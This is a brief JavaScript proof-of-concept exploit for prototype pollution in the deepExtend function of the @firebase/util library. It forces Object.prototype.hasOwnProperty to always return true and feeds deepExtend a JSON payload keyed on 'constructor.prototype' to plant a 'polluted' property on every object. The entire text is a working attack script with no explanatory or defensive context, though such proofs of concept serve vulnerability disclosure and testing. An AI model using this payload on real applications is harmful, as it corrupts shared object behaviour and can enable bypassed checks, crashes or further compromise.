Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const utils = require('@firebase/util');
const source = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
utils.deepExtend({}, source);
console.log({}.polluted);